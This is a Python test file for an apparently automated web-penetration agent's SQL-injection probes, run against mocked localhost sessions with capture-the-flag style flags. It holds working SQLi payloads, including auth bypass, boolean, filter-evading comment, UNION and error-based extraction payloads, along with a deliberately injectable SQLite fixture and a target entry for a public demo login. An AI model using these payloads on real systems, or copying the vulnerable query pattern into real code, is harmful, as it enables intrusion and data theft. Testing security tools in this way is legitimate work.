from __future__ import annotations

import json
import re
import sqlite3
from urllib.parse import parse_qs, urljoin, urlsplit, urlunsplit

from ravage.agent_core.agent_state import AgentState
from ravage.agent_core.surface_graph import SurfaceGraphState
from ravage.probe_suite_parts.sqli.sqli import (
    _target_looks_auth_bypass_candidate,
    probe_filtered_query_bypass,
    probe_sqli_differential,
    probe_sqli_exploit_runner,
)
from ravage.probe_suite_parts.sqli.sqli_targets import _sqli_targets
from ravage.probe_suite_parts.sqli.sqli_transport import _send_sqli_target
from ravage.probes.sqli_extractor.auth import _auth_bypass_cases
from ravage.web_core.http_probe import ProbeResponse

_MIN_LONG_EXTRACTION_OFFSET = 73
_MAX_PARENTHESES_UNION_REQUESTS = 100


def test_testfire_uid_form_is_an_auth_bypass_candidate() -> None:
    target = {
        "kind": "form",
        "url": "https://demo.testfire.net/doLogin",
        "input": "uid",
        "form": {
            "inputs": [
                {"name": "uid", "type": "text"},
                {"name": "passw", "type": "password"},
                {"name": "btnSubmit", "type": "submit"},
            ]
        },
    }

    assert _target_looks_auth_bypass_candidate(target)


def test_sqli_targets_skip_off_origin_parameters_and_prioritize_contact_forms() -> None:
    state = AgentState()
    state.surface = {
        "target_url": "http://localhost:64221/",
        "origin": "http://localhost:64221",
        "parameters": [
            {
                "name": "username",
                "locations": ["https://formbold.com/s/unique_form_id"],
                "priority": 200,
            },
            {
                "name": "v",
                "locations": ["http://localhost:64221/404.html?v=home"],
                "priority": 1,
            },
        ],
        "forms": [
            {
                "method": "POST",
                "action": "http://localhost:64221/send.php",
                "categories": ["contact", "message"],
                "inputs": [
                    {"name": "fullname", "type": "text"},
                    {"name": "email", "type": "email"},
                    {"name": "phone", "type": "text"},
                    {"name": "subject", "type": "text"},
                    {"name": "message", "type": "textarea"},
                    {"name": "submit", "type": "submit"},
                ],
            }
        ],
    }

    targets = _sqli_targets(state)
    urls = [str(target.get("url") or "") for target in targets]

    assert "https://formbold.com/s/unique_form_id" not in urls

    contact_index = _target_index(
        targets,
        url="http://localhost:64221/send.php",
        input_name="fullname",
    )
    dead_query_index = _target_index(
        targets,
        url="http://localhost:64221/404.html?v=home",
        input_name="v",
    )

    assert contact_index < dead_query_index


def test_sqli_targets_prioritize_observed_json_request_template() -> None:
    state = AgentState()
    state.surface = {
        "target_url": "http://localhost:64221/",
        "origin": "http://localhost:64221",
        "parameters": [
            {
                "name": "EIO",
                "locations": ["http://localhost:64221/graphql?EIO=4"],
                "priority": 250,
            }
        ],
    }
    state.signals = {
        "request_templates": [
            json.dumps(
                {
                    "source": "fetch",
                    "method": "POST",
                    "url": "/jobs",
                    "headers": {"Content-Type": "application/json"},
                    "fields": {"job_type": "premium"},
                },
                sort_keys=True,
            )
        ]
    }

    targets = _sqli_targets(state)

    assert targets[0]["kind"] == "replay"
    assert targets[0]["url"] == "http://localhost:64221/jobs"
    assert targets[0]["input"] == "job_type"
    assert targets[0]["method"] == "POST"
    assert targets[0]["encoding"] == "application/json"
    assert targets[0]["form"] == {"job_type": "premium"}


def test_sqli_targets_do_not_invent_post_replay_from_source_only_template() -> None:
    state = AgentState()
    state.surface = {
        "target_url": "http://localhost:64221/",
        "origin": "http://localhost:64221",
        "request_templates": [
            {
                "source": "source_code",
                "method": "POST",
                "url": "http://localhost:64221/internal/search",
                "fields": {"term": ""},
            }
        ],
    }

    targets = _sqli_targets(state)

    assert not any(
        target["url"] == "http://localhost:64221/internal/search" for target in targets
    )


def test_sqli_targets_use_observed_post_template_not_source_only_hint() -> None:
    state = AgentState()
    state.surface = {
        "target_url": "http://localhost:64221/",
        "origin": "http://localhost:64221",
        "request_templates": [
            {
                "source": "surface_graph",
                "method": "POST",
                "url": "http://localhost:64221/visible/search",
                "fields": {"query": ""},
            },
            {
                "source": "source_code",
                "method": "POST",
                "url": "http://localhost:64221/internal/search",
                "fields": {"term": ""},
            },
        ],
    }

    targets = _sqli_targets(state)

    assert targets[0]["url"] == "http://localhost:64221/visible/search"
    assert targets[0]["input"] == "query"
    assert not any(
        target["url"] == "http://localhost:64221/internal/search" for target in targets
    )


def test_sqli_targets_build_exact_get_replay_with_required_source_query_shape() -> None:
    state = AgentState()
    state.surface_graph = SurfaceGraphState.for_target("http://localhost:64221/")
    state.surface = {
        "target_url": "http://localhost:64221/",
        "origin": "http://localhost:64221",
        "source_candidates": [
            {
                "candidate_id": "source-candidate-1",
                "family": "sql_injection",
                "method": "GET",
                "route": "/unlinked/search",
                "input_name": "term",
                "input_location": "query",
                "route_binding": "direct",
                "live_validation": "automatic_get_query",
                "query_fields": [
                    {"name": "term", "required": True, "value_kind": "string"},
                    {"name": "tenant", "required": True, "value_kind": "string"},
                ],
                "relative_file": "app.py",
                "line": 17,
                "sink_kind": "sql_execute",
            }
        ],
    }

    targets = _sqli_targets(state)

    assert targets[0] == {
        "kind": "replay",
        "url": "http://localhost:64221/unlinked/search?tenant=ravage",
        "input": "term",
        "payload_field": "term",
        "input_location": "query",
        "method": "GET",
        "encoding": "application/x-www-form-urlencoded",
        "required_fields": ["tenant", "term"],
        "hints": ["source_code", "source_family:sql_injection"],
        "source_candidate_ids": ["source-candidate-1"],
        "priority": 360,
    }


def test_source_validation_limits_sqli_to_source_candidates() -> None:
    state = AgentState()
    state.surface_graph = SurfaceGraphState.for_target("http://localhost:64221/")
    state.surface = {
        "target_url": "http://localhost:64221/",
        "origin": "http://localhost:64221",
        "source_validation_probe": "sqli_differential",
        "source_validation_candidate_ids": ["source-candidate-1"],
        "source_candidates": [
            {
                "candidate_id": "source-candidate-1",
                "family": "sql_injection",
                "method": "GET",
                "route": "/unlinked/search",
                "input_name": "term",
                "input_location": "query",
                "route_binding": "direct",
                "live_validation": "automatic_get_query",
                "query_fields": [
                    {"name": "term", "required": True, "value_kind": "string"}
                ],
                "relative_file": "app.py",
                "line": 17,
            }
        ],
        "parameters": [
            {
                "name": "visible",
                "locations": ["http://localhost:64221/?visible=1"],
                "priority": 999,
            }
        ],
    }

    targets = _sqli_targets(state)

    assert [(target["url"], target["input"]) for target in targets] == [
        ("http://localhost:64221/unlinked/search", "term")
    ]


def test_source_validation_deduplicates_repeated_sink_lines() -> None:
    state = AgentState()
    state.surface_graph = SurfaceGraphState.for_target("http://localhost:64221/")
    state.surface = {
        "target_url": "http://localhost:64221/",
        "origin": "http://localhost:64221",
        "source_validation_probe": "sqli_differential",
        "source_validation_candidate_ids": ["source-line-1", "source-line-2"],
        "source_candidates": [
            {
                "candidate_id": candidate_id,
                "family": "sql_injection",
                "method": "GET",
                "route": "/unlinked/search",
                "input_name": "term",
                "input_location": "query",
                "route_binding": "direct",
                "live_validation": "automatic_get_query",
                "query_fields": [
                    {"name": "term", "required": True, "value_kind": "string"}
                ],
                "relative_file": "app.py",
                "line": line,
            }
            for candidate_id, line in (("source-line-1", 17), ("source-line-2", 18))
        ],
    }

    targets = _sqli_targets(state)

    assert len(targets) == 1
    assert targets[0]["source_candidate_ids"] == ["source-line-1", "source-line-2"]


def test_source_validation_uses_graph_origin_when_surface_origin_is_stale() -> None:
    state = AgentState()
    state.surface_graph = SurfaceGraphState.for_target("http://localhost:9001/")
    state.surface = {
        "target_url": "http://localhost:9002/",
        "origin": "http://localhost:9002",
        "source_validation_probe": "sqli_differential",
        "source_validation_candidate_ids": ["source-candidate-1"],
        "source_candidates": [
            {
                "candidate_id": "source-candidate-1",
                "family": "sql_injection",
                "method": "GET",
                "route": "/unlinked/search",
                "input_name": "term",
                "input_location": "query",
                "route_binding": "direct",
                "live_validation": "automatic_get_query",
                "query_fields": [
                    {"name": "term", "required": True, "value_kind": "string"}
                ],
                "relative_file": "app.py",
                "line": 17,
            }
        ],
    }

    targets = _sqli_targets(state)

    assert [target["url"] for target in targets] == [
        "http://localhost:9001/unlinked/search"
    ]


def test_post_query_replay_transport_keeps_payload_in_url() -> None:
    target = {
        "kind": "replay",
        "method": "POST",
        "url": "http://localhost:64221/unlinked/search",
        "input": "term",
        "input_location": "query",
    }
    session = _PostQuerySession()

    _send_sqli_target(session, target, "quoted'value")  # type: ignore[arg-type]

    assert target["input_location"] == "query"
    assert "form" not in target
    assert session.method == "POST"
    assert parse_qs(urlsplit(session.url).query) == {"term": ["quoted'value"]}
    assert session.data is None


def test_source_validation_detects_hidden_string_boolean_sqli_in_five_requests() -> None:
    state = AgentState()
    state.surface_graph = SurfaceGraphState.for_target("http://localhost:64221/")
    state.surface = {
        "source_validation_probe": "sqli_differential",
        "source_validation_candidate_ids": ["source-candidate-1"],
        "source_candidates": [
            {
                "candidate_id": "source-candidate-1",
                "family": "sql_injection",
                "method": "GET",
                "route": "/search",
                "input_name": "term",
                "input_location": "query",
                "route_binding": "direct",
                "live_validation": "automatic_get_query",
                "query_fields": [
                    {"name": "term", "required": True, "value_kind": "string"}
                ],
            }
        ],
    }
    session = _HiddenSourceBooleanSession()

    result = probe_sqli_differential(session, state)  # type: ignore[arg-type]

    assert result.ok
    assert len(result.requests) == 5
    assert result.findings[0]["type"] == "blind_sql_injection_boolean_signal"
    assert "' OR '1'='1' -- " in str(result.findings[0]["true_payload"])


def test_clean_source_validation_uses_seven_requests() -> None:
    state = AgentState()
    state.surface_graph = SurfaceGraphState.for_target("http://localhost:64221/")
    state.surface = {
        "source_validation_probe": "sqli_differential",
        "source_validation_candidate_ids": ["source-candidate-1"],
        "source_candidates": [
            {
                "candidate_id": "source-candidate-1",
                "family": "sql_injection",
                "method": "GET",
                "route": "/search",
                "input_name": "term",
                "input_location": "query",
                "route_binding": "direct",
                "live_validation": "automatic_get_query",
                "query_fields": [
                    {"name": "term", "required": True, "value_kind": "string"}
                ],
            }
        ],
    }
    session = _CleanSourceSession()

    result = probe_sqli_differential(session, state)  # type: ignore[arg-type]

    assert not result.ok
    assert len(result.requests) == 7
    assert session.request_count == 7


def test_sqli_targets_only_demote_replays_that_received_auth_prepass() -> None:
    state = AgentState()
    state.surface = {
        "target_url": "http://localhost:64221/",
        "origin": "http://localhost:64221",
        "parameters": [
            {
                "name": "category",
                "locations": ["http://localhost:64221/?category=News"],
                "priority": 200,
            }
        ],
    }
    state.signals = {
        "request_templates": [
            json.dumps(
                {
                    "source": "surface_graph",
                    "method": "POST",
                    "url": "/admin.php",
                    "fields": {"password": "", "tenant": "acme", "username": ""},
                },
                sort_keys=True,
            ),
            json.dumps(
                {
                    "source": "browser",
                    "method": "POST",
                    "url": "/api/session/search",
                    "headers": {"Content-Type": "application/json"},
                    "fields": {"category": "News"},
                },
                sort_keys=True,
            ),
        ]
    }

    targets = _sqli_targets(state)
    data_replay_index = _target_index(
        targets,
        url="http://localhost:64221/api/session/search",
        input_name="category",
    )
    query_index = _target_index(
        targets,
        url="http://localhost:64221/?category=News",
        input_name="category",
    )
    auth_username_index = _target_index(
        targets,
        url="http://localhost:64221/admin.php",
        input_name="username",
    )
    auth_password_index = _target_index(
        targets,
        url="http://localhost:64221/admin.php",
        input_name="password",
    )
    adjacent_tenant_index = _target_index(
        targets,
        url="http://localhost:64221/admin.php",
        input_name="tenant",
    )

    assert data_replay_index < query_index
    assert adjacent_tenant_index < query_index
    assert query_index < auth_username_index
    assert query_index < auth_password_index


def test_auth_bypass_prepass_interleaves_username_and_password_fields() -> None:
    cases = _auth_bypass_cases(["admin", "root"])

    assert {case.input_name for case in cases[:8]} == {"username", "password"}


def test_sqli_targets_keep_confirmed_auth_replay_ahead_of_unconfirmed_query() -> None:
    state = AgentState()
    state.surface = {
        "target_url": "http://localhost:64221/",
        "origin": "http://localhost:64221",
        "parameters": [
            {
                "name": "category",
                "locations": ["http://localhost:64221/?category=News"],
                "priority": 200,
            }
        ],
    }
    state.signals = {
        "sqli_replays": [
            json.dumps(
                {
                    "method": "POST",
                    "url": "http://localhost:64221/admin.php",
                    "payload_field": "username",
                    "form": {"password": "", "username": ""},
                    "required_fields": ["password", "username"],
                },
                sort_keys=True,
            )
        ]
    }

    targets = _sqli_targets(state)

    assert targets[0]["kind"] == "replay"
    assert targets[0]["url"] == "http://localhost:64221/admin.php"
    assert targets[0]["input"] == "username"


def test_sqli_targets_ignore_static_oauth_replay_noise() -> None:
    state = AgentState()
    state.surface = {
        "target_url": "http://localhost:64221/",
        "origin": "http://localhost:64221",
    }
    state.signals = {
        "request_templates": [
            json.dumps(
                {
                    "source": "fetch",
                    "method": "POST",
                    "url": "/jobs",
                    "headers": {"Content-Type": "application/json"},
                    "fields": {"job_type": "ravage"},
                },
                sort_keys=True,
            )
        ],
        "sqli_replays": [
            json.dumps(
                {
                    "method": "GET",
                    "payload_field": "EIO",
                    "url": "http://localhost:64221/docs/oauth2-redirect?EIO=%25",
                },
                sort_keys=True,
            )
        ],
    }

    targets = _sqli_targets(state)

    assert targets[0]["kind"] == "replay"
    assert targets[0]["url"] == "http://localhost:64221/jobs"
    assert all("oauth2-redirect" not in str(target.get("url") or "") for target in targets)


def test_sqli_differential_replays_json_template_literal_comment_bypass() -> None:
    state = AgentState()
    state.surface = {
        "target_url": "http://localhost:64221/",
        "origin": "http://localhost:64221",
    }
    state.signals = {
        "request_templates": [
            json.dumps(
                {
                    "source": "fetch",
                    "method": "POST",
                    "url": "/jobs",
                    "headers": {"Content-Type": "application/json"},
                    "fields": {"job_type": "premium"},
                },
                sort_keys=True,
            )
        ]
    }

    result = probe_sqli_differential(_JobsJsonSqliSession(), state)  # type: ignore[arg-type]

    assert result.ok
    assert result.findings[0]["type"] == "sql_literal_comment_exposed_secret"
    assert result.findings[0]["payload"] == "premium'--"


def test_sqli_differential_tries_post_auth_form_bypass_before_get_noise() -> None:
    state = AgentState()
    state.surface = {
        "target_url": "http://localhost:64221/",
        "origin": "http://localhost:64221",
        "forms": [
            {
                "method": "POST",
                "action": "http://localhost:64221/admin.php",
                "categories": ["auth"],
                "inputs": [
                    {"name": "username", "type": "text", "value": ""},
                    {"name": "password", "type": "password", "value": ""},
                    {"name": "submit", "type": "submit", "value": "Login"},
                ],
            }
        ],
        "parameters": [
            {
                "name": "username",
                "locations": ["http://localhost:64221/admin.php?username=guest"],
                "priority": 200,
            }
        ],
    }

    result = probe_sqli_differential(_AdminPhpAuthSqliSession(), state)  # type: ignore[arg-type]

    assert result.ok
    assert result.findings[0]["type"] == "sqli_auth_bypass_proof"
    assert result.findings[0]["payload"] == "admin' -- "
    assert any(request.get("probe_kind") == "auth_bypass" for request in result.requests)


def test_sqli_differential_uses_objective_category_bypass_for_hidden_secret_post() -> None:
    state = AgentState()
    state.summary = "Find the posts that belong to the secret category."
    state.surface = {
        "target_url": "http://localhost:64221/",
        "origin": "http://localhost:64221",
        "parameters": [
            {
                "name": "category",
                "locations": ["http://localhost:64221/?category=News"],
                "priority": 200,
            }
        ],
        "forms": [
            {
                "method": "GET",
                "action": "http://localhost:64221/",
                "categories": ["query"],
                "inputs": [{"name": "category", "type": "select"}],
            }
        ],
    }
    state.signals = {
        "markers": ["hidden posts", "secret category"],
        "parameters": ["category"],
        "request_templates": [
            json.dumps(
                {
                    "source": "surface_graph",
                    "method": "POST",
                    "url": "/admin.php",
                    "fields": {"password": "", "username": ""},
                },
                sort_keys=True,
            )
        ],
    }

    result = probe_sqli_differential(_SecretCategoryPhpSqliSession(), state)  # type: ignore[arg-type]

    assert result.ok
    assert result.findings[0]["type"] == "sqli_objective_value_bypass_proof"
    assert result.findings[0]["payload"] == "News' OR category='Secret'-- -"
    assert result.findings[0]["proofs"] == ["flag{unit_hidden_secret_category_post}"]
    assert any(request.get("probe_kind") == "objective_value_bypass" for request in result.requests)

    targets = _sqli_targets(state)
    category_index = _target_index(
        targets,
        url="http://localhost:64221/?category=News",
        input_name="category",
    )
    auth_replay_index = _target_index(
        targets,
        url="http://localhost:64221/admin.php",
        input_name="username",
    )
    assert category_index < auth_replay_index


def test_filtered_query_bypass_replays_json_template_literal_comment_bypass() -> None:
    state = AgentState()
    state.surface = {
        "target_url": "http://localhost:64221/",
        "origin": "http://localhost:64221",
    }
    state.signals = {
        "request_templates": [
            json.dumps(
                {
                    "source": "fetch",
                    "method": "POST",
                    "url": "/jobs",
                    "headers": {"Content-Type": "application/json"},
                    "fields": {"job_type": "ravage"},
                },
                sort_keys=True,
            )
        ]
    }

    result = probe_filtered_query_bypass(_JobsJsonSqliSession(), state)  # type: ignore[arg-type]

    assert result.ok
    assert result.findings[0]["type"] == "sql_literal_comment_exposed_secret"
    assert result.findings[0]["payload"] == "premium'--"


def test_sqli_exploit_continues_unclosed_error_based_flag_chunks() -> None:
    state = AgentState()
    state.surface = {
        "target_url": "http://localhost:64221/",
        "origin": "http://localhost:64221",
        "forms": [
            {
                "method": "POST",
                "action": "http://localhost:64221/send.php",
                "categories": ["contact", "message"],
                "inputs": [
                    {"name": "fullname", "type": "text"},
                    {"name": "email", "type": "email"},
                    {"name": "phone", "type": "text"},
                    {"name": "subject", "type": "text"},
                    {"name": "message", "type": "textarea"},
                    {"name": "submit", "type": "submit", "value": "submit"},
                ],
            }
        ],
    }
    session = _LongMysqlErrorSqliSession()

    result = probe_sqli_exploit_runner(session, state)  # type: ignore[arg-type]

    assert result.ok
    assert any(session.flag in _finding_proofs(finding) for finding in result.findings)
    assert any(
        row.get("value") == session.flag
        for finding in result.findings
        for row in _finding_rows(finding)
    )
    assert max(session.substring_starts) > _MIN_LONG_EXTRACTION_OFFSET


class _PostQuerySession:
    target_url = "http://localhost:64221/"

    def __init__(self) -> None:
        self.method = ""
        self.url = ""
        self.data: bytes | None = None

    def request(
        self,
        method: str,
        url: str,
        *,
        data: bytes | None = None,
        headers: dict[str, str] | None = None,
    ) -> ProbeResponse:
        _ = headers
        self.method = method
        self.url = url
        self.data = data
        return ProbeResponse(
            method=method,
            url=url,
            status=200,
            final_url=url,
            elapsed_ms=1,
            body="ok",
        )


class _HiddenSourceBooleanSession:
    target_url = "http://localhost:64221/"

    def get(self, url: str, *, headers: dict[str, str] | None = None) -> ProbeResponse:
        _ = headers
        value = parse_qs(urlsplit(url).query, keep_blank_values=True).get("term", [""])[0]
        body = (
            "matching database rows: " + ("result " * 8)
            if "' OR '1'='1' -- " in value
            else "no matching rows"
        )
        return ProbeResponse(
            method="GET",
            url=url,
            status=200,
            final_url=url,
            elapsed_ms=1,
            body=body,
        )


class _CleanSourceSession:
    target_url = "http://localhost:64221/"

    def __init__(self) -> None:
        self.request_count = 0

    def get(self, url: str, *, headers: dict[str, str] | None = None) -> ProbeResponse:
        _ = headers
        self.request_count += 1
        return ProbeResponse(
            method="GET",
            url=url,
            status=200,
            final_url=url,
            elapsed_ms=1,
            body="no matching rows",
        )


class _ParenthesizedSqliteUnionSession:
    target_url = "http://localhost:64221/"
    origin = "http://localhost:64221"
    flag = "flag{unit_parenthesized_catalog_union}"

    def __init__(self) -> None:
        self.connection = sqlite3.connect(":memory:")
        self.connection.executescript(
            """
            CREATE TABLE products (
                id INTEGER PRIMARY KEY,
                name TEXT,
                category TEXT,
                price INTEGER,
                active INTEGER
            );
            CREATE TABLE secrets (key TEXT, value TEXT);
            INSERT INTO products VALUES (1, 'Support', 'plans', 10, 1);
            """
        )
        self.connection.execute(
            "INSERT INTO secrets (key, value) VALUES (?, ?)",
            ("catalog_export", self.flag),
        )

    def absolute(self, value: str) -> str:
        return urljoin(self.target_url, value)

    def in_scope(self, url: str) -> bool:
        return urlsplit(self.absolute(url)).netloc == urlsplit(self.target_url).netloc

    def get(self, url: str, *, headers: dict[str, str] | None = None) -> ProbeResponse:
        del headers
        absolute = self.absolute(url)
        query = parse_qs(urlsplit(absolute).query, keep_blank_values=True)
        value = query.get("q", [""])[-1]
        sql = (  # noqa: S608 - intentional vulnerable SQL fixture.
            "SELECT id, name, category, price FROM products "
            f"WHERE active = 1 AND (name LIKE '%{value}%' OR category LIKE '%{value}%') "
            "ORDER BY id"
        )
        try:
            rows = self.connection.execute(sql).fetchall()
            body = "<table>" + "".join(
                "<tr>" + "".join(f"<td>{cell}</td>" for cell in row) + "</tr>"
                for row in rows
            ) + "</table>"
            status = 200
        except sqlite3.Error as exc:
            body = f"Search error: {type(exc).__name__}: {exc}"
            status = 200
        return ProbeResponse(
            method="GET",
            url=absolute,
            status=status,
            final_url=absolute,
            elapsed_ms=2,
            body=body,
        )


def test_sqli_exploit_closes_parenthesized_like_before_union() -> None:
    state = AgentState()
    state.surface = {
        "target_url": "http://localhost:64221/",
        "origin": "http://localhost:64221",
    }
    state.signals = {
        "sqli_replays": [
            json.dumps(
                {
                    "method": "GET",
                    "url": "http://localhost:64221/catalog?q=plans",
                    "payload_field": "q",
                    "required_fields": ["q"],
                },
                sort_keys=True,
            )
        ]
    }
    session = _ParenthesizedSqliteUnionSession()

    result = probe_sqli_exploit_runner(session, state)  # type: ignore[arg-type]

    assert result.ok
    assert any(finding.get("proof") == session.flag for finding in result.findings)
    assert any(
        request.get("phase") == "union_probe"
        and str(request.get("payload") or "").startswith("')")
        for request in result.requests
    )
    assert len(result.requests) < _MAX_PARENTHESES_UNION_REQUESTS


def _finding_proofs(finding: dict[str, object]) -> list[str]:
    proofs = finding.get("proofs")
    if not isinstance(proofs, list):
        return []
    return [str(proof) for proof in proofs]


def _finding_rows(finding: dict[str, object]) -> list[dict[str, object]]:
    rows = finding.get("rows")
    if not isinstance(rows, list):
        return []
    return [
        {str(key): value for key, value in row.items()}
        for row in rows
        if isinstance(row, dict)
    ]


def _target_index(
    targets: list[dict[str, object]],
    *,
    url: str,
    input_name: str,
) -> int:
    for index, target in enumerate(targets):
        target_url = str(target.get("url") or "")
        target_input = str(target.get("input") or "")
        if target_url == url and target_input == input_name:
            return index

    message = f"target not found: {url} input={input_name}"
    raise AssertionError(message)


class _JobsJsonSqliSession:
    target_url = "http://localhost:64221/"
    origin = "http://localhost:64221"

    def absolute(self, value: str) -> str:
        return urljoin(self.target_url, value)

    def in_scope(self, url: str) -> bool:
        target = urlsplit(self.target_url)
        candidate = urlsplit(self.absolute(url))
        return (target.scheme, target.netloc) == (candidate.scheme, candidate.netloc)

    def get(self, url: str, *, headers: dict[str, str] | None = None) -> ProbeResponse:
        return self.request("GET", url, headers=headers)

    def post_form(
        self,
        url: str,
        fields: dict[str, str],
        *,
        headers: dict[str, str] | None = None,
    ) -> ProbeResponse:
        _ = fields, headers
        return self._response("POST", url, 404, "missing")

    def request(
        self,
        method: str,
        url: str,
        *,
        data: bytes | None = None,
        headers: dict[str, str] | None = None,
    ) -> ProbeResponse:
        _ = headers
        absolute = self.absolute(url)
        if method.upper() != "POST" or urlsplit(absolute).path != "/jobs":
            return self._response(method, absolute, 200, "public landing page")

        try:
            payload = json.loads((data or b"{}").decode("utf-8"))
        except ValueError:
            payload = {}
        job_type = str(payload.get("job_type") or "")
        if job_type == "premium":
            return self._response(method, absolute, 403, '{"detail":"Access denied"}')

        filtered = job_type
        blocked_words = (
            "OR",
            "or",
            "AND",
            "and",
            "SELECT",
            "select",
            "UNION",
            "union",
            "FROM",
            "from",
            "WHERE",
            "where",
        )
        for word in blocked_words:
            filtered = filtered.replace(word, "")

        if filtered.startswith("premium'--"):
            body = '[{"id":3,"type":"premium","description":"flag{unit_xben_006_json_replay}"}]'
            return self._response(method, absolute, 200, body)
        if any(marker in filtered for marker in ("'", '"', "\\", ")")):
            return self._response(method, absolute, 500, "Internal Server Error")
        if not filtered or filtered in {"front-end", "back-end"}:
            body = '[{"id":1,"type":"front-end"},{"id":2,"type":"back-end"}]'
            return self._response(method, absolute, 200, body)
        return self._response(method, absolute, 200, "[]")

    def _response(self, method: str, url: str, status: int, body: str) -> ProbeResponse:
        absolute = self.absolute(url)
        parsed = urlsplit(absolute)
        final_url = urlunsplit((parsed.scheme, parsed.netloc, parsed.path or "/", parsed.query, ""))
        return ProbeResponse(
            method=method.upper(),
            url=final_url,
            status=status,
            final_url=final_url,
            elapsed_ms=5,
            headers={},
            body=body,
        )


class _AdminPhpAuthSqliSession:
    target_url = "http://localhost:64221/"
    origin = "http://localhost:64221"

    def absolute(self, value: str) -> str:
        return urljoin(self.target_url, value)

    def in_scope(self, url: str) -> bool:
        target = urlsplit(self.target_url)
        candidate = urlsplit(self.absolute(url))
        return (target.scheme, target.netloc) == (candidate.scheme, candidate.netloc)

    def get(self, url: str, *, headers: dict[str, str] | None = None) -> ProbeResponse:
        _ = headers
        body = "<form><input name='username'><input name='password'></form>"
        return self._response("GET", url, 200, body)

    def post_form(
        self,
        url: str,
        fields: dict[str, str],
        *,
        headers: dict[str, str] | None = None,
    ) -> ProbeResponse:
        _ = headers
        username = fields.get("username", "")
        if username.startswith("admin' --"):
            return self._response(
                "POST",
                url,
                200,
                "Welcome admin flag{unit_admin_php_sqli_auth_bypass}",
            )
        return self._response("POST", url, 200, "Invalid username or password")

    def request(
        self,
        method: str,
        url: str,
        *,
        data: bytes | None = None,
        headers: dict[str, str] | None = None,
    ) -> ProbeResponse:
        _ = data, headers
        return self._response(method, url, 200, "public page")

    def _response(self, method: str, url: str, status: int, body: str) -> ProbeResponse:
        absolute = self.absolute(url)
        parsed = urlsplit(absolute)
        final_url = urlunsplit((parsed.scheme, parsed.netloc, parsed.path or "/", parsed.query, ""))
        return ProbeResponse(
            method=method.upper(),
            url=final_url,
            status=status,
            final_url=final_url,
            elapsed_ms=5,
            headers={},
            body=body,
        )


class _SecretCategoryPhpSqliSession:
    target_url = "http://localhost:64221/"
    origin = "http://localhost:64221"

    def absolute(self, value: str) -> str:
        return urljoin(self.target_url, value)

    def in_scope(self, url: str) -> bool:
        target = urlsplit(self.target_url)
        candidate = urlsplit(self.absolute(url))
        return (target.scheme, target.netloc) == (candidate.scheme, candidate.netloc)

    def get(self, url: str, *, headers: dict[str, str] | None = None) -> ProbeResponse:
        _ = headers
        absolute = self.absolute(url)
        query = parse_qs(urlsplit(absolute).query, keep_blank_values=True)
        category = query.get("category", [""])[0]
        if category == "Secret":
            category = ""
        if (
            "category='Secret'" in category
            or "LOWER(category)='secret'" in category
            or "OR 1=1" in category
        ):
            return self._response(
                "GET",
                absolute,
                200,
                "<article><h2>SECRET POST</h2>"
                "<FLAG>flag{unit_hidden_secret_category_post}</FLAG></article>",
            )
        if category == "News":
            return self._response("GET", absolute, 200, "<article><h2>Public news</h2></article>")
        return self._response("GET", absolute, 200, "<article><h2>Published posts</h2></article>")

    def post_form(
        self,
        url: str,
        fields: dict[str, str],
        *,
        headers: dict[str, str] | None = None,
    ) -> ProbeResponse:
        _ = fields, headers
        return self._response("POST", url, 405, "method not allowed")

    def request(
        self,
        method: str,
        url: str,
        *,
        data: bytes | None = None,
        headers: dict[str, str] | None = None,
    ) -> ProbeResponse:
        _ = data, headers
        if method.upper() == "GET":
            return self.get(url)
        return self._response(method, url, 405, "method not allowed")

    def _response(self, method: str, url: str, status: int, body: str) -> ProbeResponse:
        absolute = self.absolute(url)
        parsed = urlsplit(absolute)
        final_url = urlunsplit((parsed.scheme, parsed.netloc, parsed.path or "/", parsed.query, ""))
        return ProbeResponse(
            method=method.upper(),
            url=final_url,
            status=status,
            final_url=final_url,
            elapsed_ms=5,
            headers={},
            body=body,
        )


class _LongMysqlErrorSqliSession:
    target_url = "http://localhost:64221/"
    origin = "http://localhost:64221"

    def __init__(self) -> None:
        self.flag = (
            "flag{unit_long_error_based_sqli_extraction_requires_more_"
            "than_four_chunks_with_a_generated_benchmark_style_suffix_"
            "20260709_xben_071_24}"
        )
        self.substring_starts: list[int] = []

    def absolute(self, value: str) -> str:
        return urljoin(self.target_url, value)

    def in_scope(self, url: str) -> bool:
        target = urlsplit(self.target_url)
        candidate = urlsplit(self.absolute(url))
        return (target.scheme, target.netloc) == (candidate.scheme, candidate.netloc)

    def get(self, url: str, *, headers: dict[str, str] | None = None) -> ProbeResponse:
        _ = headers
        return self._response("GET", url, 200, "<form></form>")

    def post_form(
        self,
        url: str,
        fields: dict[str, str],
        *,
        headers: dict[str, str] | None = None,
    ) -> ProbeResponse:
        _ = headers
        payload = next(
            (
                value
                for value in fields.values()
                if any(marker in value for marker in ("updatexml", "extractvalue", "substring"))
            ),
            fields.get("fullname", ""),
        )
        leak = self._leak_for_payload(payload)
        if leak:
            body = f"<b>Fatal error</b>: XPATH syntax error: '~{leak}~'"
        else:
            body = "Contact sent successfully"
        return self._response("POST", url, 200, body)

    def request(
        self,
        method: str,
        url: str,
        *,
        data: bytes | None = None,
        headers: dict[str, str] | None = None,
    ) -> ProbeResponse:
        _ = data, headers
        return self._response(method, url, 200, "Contact sent successfully")

    def _leak_for_payload(self, payload: str) -> str:
        leak = ""
        if "database()" in payload:
            leak = "challenge"
        elif "group_concat(table_name)" in payload:
            leak = "flag,contact"
        elif "group_concat(column_name)" in payload and "table_name=0x666c6167" in payload:
            leak = "flag,id"
        elif "group_concat(column_name)" in payload and "table_name=0x636f6e74616374" in payload:
            leak = "name,message,id,phone,subject"
        else:
            match = re.search(
                r"substring\(cast\(`(?P<column>[^`]+)` as char\),(?P<start>\d+),(?P<length>\d+)\) "
                r"from `(?P<table>[^`]+)` limit (?P<row>\d+),1",
                payload,
            )
            if match:
                start = int(match.group("start"))
                length = int(match.group("length"))
                self.substring_starts.append(start)
                if (
                    match.group("table") == "flag"
                    and match.group("column") == "flag"
                    and match.group("row") == "0"
                ):
                    leak = self.flag[start - 1 : start - 1 + length]
        return leak

    def _response(self, method: str, url: str, status: int, body: str) -> ProbeResponse:
        absolute = self.absolute(url)
        parsed = urlsplit(absolute)
        final_url = urlunsplit((parsed.scheme, parsed.netloc, parsed.path or "/", parsed.query, ""))
        return ProbeResponse(
            method=method.upper(),
            url=final_url,
            status=status,
            final_url=final_url,
            elapsed_ms=5,
            headers={},
            body=body,
        )
